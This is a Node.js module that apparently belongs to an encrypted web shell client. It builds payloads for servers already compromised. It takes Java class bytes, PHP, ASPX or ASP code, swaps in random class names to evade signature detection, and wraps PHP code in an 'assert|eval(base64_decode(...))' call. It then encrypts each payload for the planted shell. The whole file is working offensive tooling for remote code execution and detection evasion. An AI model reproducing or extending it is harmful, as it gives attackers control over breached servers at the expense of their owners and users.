const crypto = require("./crypto");
const payload = require("./params");

function ReplaceClassName(byteCls, className) {
    let code = Buffer.from(byteCls, 'base64');//解码
    let baseHexCode = code.toString('hex');//转为16进制
   
    let hexClassName = Buffer.from(className).toString('hex');//转为16进制
    const crypto = require('crypto')
    let newClassName = crypto.randomBytes(Math.ceil(className.length / 2)).toString('hex').slice(0, className.length)
    let hexNewClassName = Buffer.from(newClassName).toString('hex')

    let oldpos = baseHexCode.indexOf(hexClassName);
    while (oldpos > -1) { // 循环替换类名为随机字符串
        baseHexCode = baseHexCode.slice(0, oldpos) + 
        (baseHexCode.slice(oldpos)).replace(new RegExp(hexClassName), hexNewClassName)

        oldpos = baseHexCode.indexOf(hexClassName);
    }
    byteCls = Buffer.from(baseHexCode, 'hex').toString('base64');
    return byteCls;
}

function GetData(key, className, params, types, encryptType) {
    let bincls;
    if (types === "jsp") {
        bincls = payload.getParamedClass(className, params);
        console.log("class data " + className + ": " + bincls.toString());

        bincls = ReplaceClassName(bincls, className);
        console.log("after ReplaceClassName:" + bincls.toString());


        bincls = Buffer.from(bincls, 'base64');
        return crypto.encryptForJava(bincls, key)
    } else if (types === 'php') {
        bincls = payload.getParamedPhp(className, params)
        bincls = Buffer.from(bincls).toString('base64');
        bincls = ("lasjfadfas.assert|eval(base64_decode('" + (bincls) + "'));")
        let encrypedBincls = crypto.encryptForPhp(bincls, key, encryptType)
        // console.log(encrypedBincls)
        return encrypedBincls
    } else if (types === 'aspx') {
        bincls = payload.getParamedAssembly(className, params)
        //if (extraData != null) {
        //	bincls = CipherUtils.mergeByteArray(bincls, extraData);
        //}
        let encrypedBincls = crypto.encryptForCSharp(bincls, key)

        // console.log(Buffer.from(encrypedBincls, 'base64'))
        return Buffer.from(encrypedBincls, 'base64')
    } else if (types === 'asp') {
        bincls = payload.getParamedAsp(className, params)
        //if (extraData != null) {
        //	bincls = CipherUtils.mergeByteArray(bincls, extraData);
        //}
        let xxx = Buffer.from(bincls).toString('hex')
        let yyy = Buffer.from(xxx, 'hex')

        return crypto.decryptForAsp(yyy, key)
    }
}

module.exports = GetData
